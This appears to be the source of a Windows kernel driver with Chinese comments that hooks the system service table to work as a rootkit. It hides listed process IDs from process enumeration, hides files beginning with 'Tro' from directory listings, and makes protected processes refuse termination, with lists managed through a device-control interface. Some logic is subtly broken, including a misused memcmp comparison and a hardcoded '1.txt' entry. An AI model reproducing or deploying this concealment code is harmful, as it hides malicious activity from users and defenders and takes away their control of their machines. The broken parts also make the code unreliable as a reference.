#include "SSDT01.h"


/*
*  Name: ULONG ValidateFileNeedHide()
*
*  Descripion: 返回文件在隐藏列表中的索引，不存在返回-1
*
*/
ULONG ValidateFileNeedHide(UNICODE_STRING  FileName){
	ULONG i = 0;

	if (FileName.Buffer == NULL) return -1;

	for (i; i < g_currFileArrayLen; i++){
		if (memcmp(FileName.Buffer, g_FileHideArray[i].Buffer, g_FileHideArray[i].Length) == g_FileHideArray[i].Length)
			return i;
	}
	return -1;
}





/*
*  Name: ULONG InsertProtectFile()
*
*  Descripion: 插入新的需要保护文件的FileName
*
*/

ULONG InsertProtectFile(UNICODE_STRING  FileName){
	
	if (ValidateFileNeedHide(FileName) == -1){
		g_FileHideArray[g_currFileArrayLen++] = FileName;
		return TRUE;
	}
	return FALSE;

}


/*
*
*  Name: NTSTATUS NtQueryDirectoryFile()
*  
*  Descripion: 自定义的 NtQuerySystemInformation，用来实现 Hook Kernel API	
*/
NTSTATUS HookNtQueryDirectoryFile(
	__in     HANDLE                 FileHandle,
	__in_opt HANDLE                 Event,
	__in_opt PIO_APC_ROUTINE        ApcRoutine,
	__in_opt PVOID                  ApcContext,
	__out    PIO_STATUS_BLOCK       IoStatusBlock,
	__out    PVOID                  FileInformation,
	__in     ULONG                  Length,
	__in     FILE_INFORMATION_CLASS FileInformationClass,
	__in     BOOLEAN                ReturnSingleEntry,
	__in_opt PUNICODE_STRING        FileName,
	__in     BOOLEAN                RestartScan
	)
{
	NTSTATUS rtStatus;
	pFILE_BOTH_DIR_INFORMATION pCurrFileInfo;               //当前文件结构体
	pFILE_BOTH_DIR_INFORMATION pPreFileInfo  =  NULL;       //上一个文件结构体
	UNICODE_STRING uniFileName;                         

	pCurrFileInfo = (pFILE_BOTH_DIR_INFORMATION)FileInformation;
	pOldNtQueryDirectoryFile = (NTQUERYDIRECTORYFILE)oldSysServiceAddr[SYSCALL_INDEX(ZwQueryDirectoryFile)]; //保存原有调用表

	rtStatus = pOldNtQueryDirectoryFile(                                            //保存原有系统调用结果
		FileHandle, 
		Event, 
		ApcRoutine, 
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
		);

	RtlInitUnicodeString(&uniFileName, pCurrFileInfo->FileName);
	if (NT_SUCCESS(rtStatus)){
		if (FileBothDirectoryInformation == FileInformationClass){
		
			while (pCurrFileInfo){
			//if (ValidateFileNeedHide(uniFileName) != -1){    //这是一个需要隐藏的文件元素  (需要删除的元素)
				if (memcmp(pCurrFileInfo->FileName,L"Tro",6)==0){
			if (pPreFileInfo != NULL){                   //当前元素不是链表内头元素
			if (pCurrFileInfo->NextEntryOffset == 0){ //当前元素是尾元素
			pPreFileInfo->NextEntryOffset = 0;    //将上个元素尾偏移置零，斩断链表
			}
			else                                     //非头非尾的中间元素
			{
			pPreFileInfo->NextEntryOffset = pCurrFileInfo->NextEntryOffset + pPreFileInfo->NextEntryOffset;
			}
			}
			else                                          //当前元素是头元素
			{
			if (pCurrFileInfo->NextEntryOffset == 0)  //单元素链表头
			{
			FileInformation = NULL;
			}
			else{                                    //多元素链表头
			(PCHAR)FileInformation += pCurrFileInfo->NextEntryOffset;
			}
			}
			}
			pPreFileInfo = pCurrFileInfo;

			if (pCurrFileInfo->NextEntryOffset != 0){  //指针偏移，用于while遍历
			pCurrFileInfo = (pFILE_BOTH_DIR_INFORMATION)(((PCHAR)pCurrFileInfo)+pCurrFileInfo->NextEntryOffset);
			}
			else
			{
			pCurrFileInfo = NULL;
			}
			}
		}
	}
	return rtStatus;
}



//=====================================================================================//
//Name: ULONG ValidateProcessNeedHide()											       //
//                                                                                     //
//Descripion: 返回 uPID 进程在隐藏列表中的索引，如果该进程在隐藏列表中不存在，则返回 -1		   //
//            				                            						       //
//=====================================================================================//
ULONG ValidateProcessNeedHide(ULONG uPID)
{
	ULONG i = 0;

	if(uPID == 0)
	{
		return -1;
	}

	for(i=0; i<g_currHideArrayLen && i<MAX_PROCESS_ARRARY_LENGTH; i++)
	{
		if(g_PIDHideArray[i] == uPID)
		{
			return i;
		}
	}
	return -1;
}


//=====================================================================================//
//Name: ULONG ValidateProcessNeedProtect()										       //
//                                                                                     //
//Descripion: 返回 uPID 进程在保护列表中的索引，如果该进程在保护列表中不存在，则返回 -1	 //
//            				                            						       //
//=====================================================================================//
ULONG ValidateProcessNeedProtect(ULONG uPID)
{
	ULONG i = 0;

	if(uPID == 0)
	{
		return -1;
	}

	for(i=0; i<g_currProtectArrayLen && i<MAX_PROCESS_ARRARY_LENGTH;i++)
	{
		if(g_PIDProtectArray[i] == uPID)
		{
			return i;
		}
	}
	return -1;
}


//=====================================================================================//
//Name: ULONG InsertHideProcess()												       //
//                                                                                     //
//Descripion: 在进程隐藏列表中插入新的进程 ID											   //
//            				                            						       //
//=====================================================================================//
ULONG InsertHideProcess(ULONG uPID)
{
	if(ValidateProcessNeedHide(uPID) == -1 && g_currHideArrayLen < MAX_PROCESS_ARRARY_LENGTH)
	{
		g_PIDHideArray[g_currHideArrayLen++] = uPID;

		return TRUE;
	}

	return FALSE;
}




//=====================================================================================//
//Name: ULONG InsertProtectProcess()											       //
//                                                                                     //
//Descripion: 在进程保护列表中插入新的进程 ID											   //
//            				                            						       //
//=====================================================================================//
ULONG InsertProtectProcess(ULONG uPID)
{
	if(ValidateProcessNeedProtect(uPID) == -1 && g_currProtectArrayLen < MAX_PROCESS_ARRARY_LENGTH)
	{
		g_PIDProtectArray[g_currProtectArrayLen++] = uPID;

		return TRUE;
	}
	return FALSE;
}




//=====================================================================================//
//Name: NTSTATUS HookNtQuerySystemInformation()									       //
//                                                                                     //
//Descripion: 自定义的 NtQuerySystemInformation，用来实现 Hook Kernel API			   //
//            				                            						       //
//=====================================================================================//
NTSTATUS HookNtQuerySystemInformation (
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	)
{
	NTSTATUS rtStatus;

	pOldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)oldSysServiceAddr[SYSCALL_INDEX(ZwQuerySystemInformation)];

	rtStatus = pOldNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if(NT_SUCCESS(rtStatus))
	{
		if(SystemProcessInformation == SystemInformationClass)
		{
			PSYSTEM_PROCESS_INFORMATION pPrevProcessInfo = NULL;
			PSYSTEM_PROCESS_INFORMATION pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation; 

			while(pCurrProcessInfo != NULL)
			{
				//获取当前遍历的 SYSTEM_PROCESS_INFORMATION 节点的进程名称和进程 ID
				ULONG uPID = (ULONG)pCurrProcessInfo->UniqueProcessId;
				UNICODE_STRING strTmpProcessName = pCurrProcessInfo->ImageName;

				//判断当前遍历的这个进程是否为需要隐藏的进程
				if(ValidateProcessNeedHide(uPID) != -1)
				{
					if(pPrevProcessInfo)
					{
						if(pCurrProcessInfo->NextEntryOffset)
						{
							//将当前这个进程(即要隐藏的进程)从 SystemInformation 中摘除(更改链表偏移指针实现)
							pPrevProcessInfo->NextEntryOffset += pCurrProcessInfo->NextEntryOffset;
						}
						else
						{
							//说明当前要隐藏的这个进程是进程链表中的最后一个
							pPrevProcessInfo->NextEntryOffset = 0;
						}
					}
					else
					{
						//第一个遍历到得进程就是需要隐藏的进程
						if(pCurrProcessInfo->NextEntryOffset)
						{
							(PCHAR)SystemInformation += pCurrProcessInfo->NextEntryOffset;
						}
						else
						{
							SystemInformation = NULL;
						}
					}
				}

				//遍历下一个 SYSTEM_PROCESS_INFORMATION 节点
				pPrevProcessInfo = pCurrProcessInfo;

				//遍历结束
				if(pCurrProcessInfo->NextEntryOffset)
				{
					pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)(((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryOffset);
				}
				else
				{
					pCurrProcessInfo = NULL;
				}
			}
		}
	}
	return rtStatus;
}


//=====================================================================================//
//Name: NTSTATUS HookNtTerminateProcess()										       //
//                                                                                     //
//Descripion: 自定义的 NtTerminateProcess，用来实现 Hook Kernel API					   //
//            				                            						       //
//=====================================================================================//
NTSTATUS HookNtTerminateProcess(
	__in_opt HANDLE ProcessHandle,
	__in NTSTATUS ExitStatus
	)
{
	ULONG uPID;
	NTSTATUS rtStatus;
	PCHAR pStrProcName;
	PEPROCESS pEProcess;
	ANSI_STRING strProcName;

	//通过进程句柄来获得该进程所对应的 FileObject 对象，由于这里是进程对象，自然获得的是 EPROCESS 对象
	rtStatus = ObReferenceObjectByHandle(ProcessHandle, FILE_READ_DATA, NULL, KernelMode, &pEProcess, NULL);
	if(!NT_SUCCESS(rtStatus))
	{
		return rtStatus;
	}

	//保存 SSDT 中原来的 NtTerminateProcess 地址
	pOldNtTerminateProcess = (NTTERMINATEPROCESS)oldSysServiceAddr[SYSCALL_INDEX(ZwTerminateProcess)];

	//通过该函数可以获取到进程名称和进程 ID，该函数在内核中实质是导出的(在 WRK 中可以看到)
	//但是 ntddk.h 中并没有到处，所以需要自己声明才能使用
	uPID = (ULONG)PsGetProcessId(pEProcess);
	pStrProcName = (PCHAR)PsGetProcessImageFileName(pEProcess);

	//通过进程名来初始化一个 ASCII 字符串
	RtlInitAnsiString(&strProcName, pStrProcName);

	if(ValidateProcessNeedProtect(uPID) != -1)
	{
		//确保调用者进程能够结束(这里主要是指 taskmgr.exe)
		if(uPID != (ULONG)PsGetProcessId(PsGetCurrentProcess()))
		{
			//如果该进程是所保护的的进程的话，则返回权限不够的异常即可
			return STATUS_ACCESS_DENIED;
		}
	}

	//对于非保护的进程可以直接调用原来 SSDT 中的 NtTerminateProcess 来结束进程
	rtStatus = pOldNtTerminateProcess(ProcessHandle, ExitStatus);

	return rtStatus;
}


//=====================================================================================//
//Name: NTSTATUS DriverEntry()													       //
//                                                                                     //
//Descripion: 入口函数，这样用来备份 SSDT 以及安装 Kernel API Hook						   //
//            				                            						       //
//=====================================================================================//
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING  pRegistryPath)
{
	ULONG i;
	NTSTATUS status;
	UNICODE_STRING strDeviceName;
	UNICODE_STRING strSymbolLinkName;
	PDEVICE_OBJECT pDeviceObject;

	pDeviceObject = NULL;

	RtlInitUnicodeString(&strDeviceName, DEVICE_NAME_PROCESS);
	RtlInitUnicodeString(&strSymbolLinkName, SYMBOLINK_NAME_PROCESS);

	for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriverObject->MajorFunction[i] = SSDT01GeneralDispatcher;
	}

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = SSDT01CreateDispatcher;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = SSDT01CloseDispatcher;
	pDriverObject->MajorFunction[IRP_MJ_READ] = SSDT01ReadDispatcher;
	pDriverObject->MajorFunction[IRP_MJ_WRITE] = SSDT01WriteDispatcher;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SSDT01DeviceIoControlDispatcher;
	
	pDriverObject->DriverUnload = SSDT01DriverUnload;

	status = IoCreateDevice(pDriverObject, 0, &strDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	if (!pDeviceObject)
	{
		return STATUS_UNEXPECTED_IO_ERROR;
	}

	//使用直接 IO 读写方式
	pDeviceObject->Flags |= DO_DIRECT_IO;
	pDeviceObject->AlignmentRequirement = FILE_WORD_ALIGNMENT;
	status = IoCreateSymbolicLink(&strSymbolLinkName, &strDeviceName);

	pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	
	//首先需要备份原来的 SSDT 系统服务描述表中所有服务的地址，这些地址主要用于实现解除 Hook
	BackupSysServicesTable();

	//安装 Hook
	InstallSysServiceHook((ULONG)ZwQuerySystemInformation, (ULONG)HookNtQuerySystemInformation);

	InstallSysServiceHook((ULONG)ZwTerminateProcess, (ULONG)HookNtTerminateProcess);

	InstallSysServiceHook((ULONG)ZwQueryDirectoryFile, (ULONG)HookNtQueryDirectoryFile);

	return STATUS_SUCCESS;
}


//=====================================================================================//
//Name: void SSDT01DriverUnload()												       //
//                                                                                     //
//Descripion: 卸载函数，这样用来解除 Kernel API Hook									   //
//            				                            						       //
//=====================================================================================//
void SSDT01DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	UNICODE_STRING strSymbolLinkName;

	DbgPrint("In SSDT01DriverUnload !");

	RtlInitUnicodeString(&strSymbolLinkName, SYMBOLINK_NAME_PROCESS);
	IoDeleteSymbolicLink(&strSymbolLinkName);
	IoDeleteDevice(pDriverObject->DeviceObject);

	//解除 Hook
	UnInstallSysServiceHook((ULONG)ZwQuerySystemInformation);


	UnInstallSysServiceHook((ULONG)ZwTerminateProcess);

	UnInstallSysServiceHook((ULONG)ZwQueryDirectoryFile);

	DbgPrint("Out SSDT01DriverUnload !");
}


//=====================================================================================//
//Name: NTSTATUS SSDT01CreateDispatcher()										       //
//                                                                                     //
//Descripion: 分发函数																   //
//            				                            						       //
//=====================================================================================//
NTSTATUS SSDT01CreateDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}


//=====================================================================================//
//Name: NTSTATUS SSDT01GeneralDispatcher()										       //
//                                                                                     //
//Descripion: 分发函数																   //
//            				                            						       //
//=====================================================================================//
NTSTATUS SSDT01CloseDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}


//=====================================================================================//
//Name: NTSTATUS SSDT01GeneralDispatcher()										       //
//                                                                                     //
//Descripion: 分发函数																   //
//            				                            						       //
//=====================================================================================//
NTSTATUS SSDT01GeneralDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_NOT_SUPPORTED;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return pIrp->IoStatus.Status;
}


//=====================================================================================//
//Name: NTSTATUS SSDT01ReadDispatcher()											       //
//                                                                                     //
//Descripion: 分发函数																   //
//            				                            						       //
//=====================================================================================//
NTSTATUS SSDT01ReadDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS rtStatus;

	rtStatus = STATUS_NOT_SUPPORTED;

	return rtStatus;
}


//=====================================================================================//
//Name: NTSTATUS SSDT01WriteDispatcher()										       //
//                                                                                     //
//Descripion: 分发函数																   //
//            				                            						       //
//=====================================================================================//
NTSTATUS SSDT01WriteDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS rtStatus;

	rtStatus = STATUS_NOT_SUPPORTED;

	return rtStatus;
}


/*
*
*Name: NTSTATUS SSDT01DeviceIoControlDispatcher()								       
*                                                                                     
*Descripion: 分发函数																   
*            				                            						       
*/
NTSTATUS SSDT01DeviceIoControlDispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS rtStatus;

	ULONG uPID;
	ULONG uInLen;
	ULONG uOutLen;
	ULONG uCtrlCode;
	UNICODE_STRING  UniFileName;
	ANSI_STRING     AnsiFileName;

	PCHAR pInBuffer;

	PIO_STACK_LOCATION pStack;	

	uPID = 0;
	rtStatus = STATUS_SUCCESS;
	pStack = IoGetCurrentIrpStackLocation(pIrp);

	uInLen = pStack->Parameters.DeviceIoControl.InputBufferLength;
	uOutLen = pStack->Parameters.DeviceIoControl.OutputBufferLength;
	uCtrlCode = pStack->Parameters.DeviceIoControl.IoControlCode;

	//使用缓冲区方式与应用程序进行通信
	pInBuffer = (PCHAR)pIrp->AssociatedIrp.SystemBuffer;
	
	if(uInLen >= 4)
	{
		//stdlib.h(atol = Array To LONG)
		uPID = atol(pInBuffer);
		RtlInitAnsiString(&AnsiFileName, pInBuffer);
		RtlInitUnicodeString(&UniFileName, L"1.txt");
		
		switch(uCtrlCode)
		{
		case IO_INSERT_PROTECT_PROCESS:
			{
				if(InsertProtectProcess(uPID) == FALSE)
				{
					rtStatus = STATUS_PROCESS_IS_TERMINATING;
				}
				break;
			}

		case IO_INSERT_HIDE_FILE:
		{
			if (InsertProtectFile(UniFileName) == FALSE){
					
				  rtStatus = STATUS_PROCESS_IS_TERMINATING;
					
			}
			break;
		}

		case IO_INSERT_HIDE_PROCESS:
		{
				if(InsertHideProcess(uPID) == FALSE)
				{
					rtStatus = STATUS_PROCESS_IS_TERMINATING;
				}
				break;
			}


		default:
			{
				rtStatus = STATUS_INVALID_VARIANT;
				break;
			}
		}
	}
	else
	{
		rtStatus = STATUS_INVALID_PARAMETER;
	}
	
	//输出信息总是为空，即该驱动程序不返回输出信息
	pIrp->IoStatus.Status = rtStatus;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return rtStatus;
}
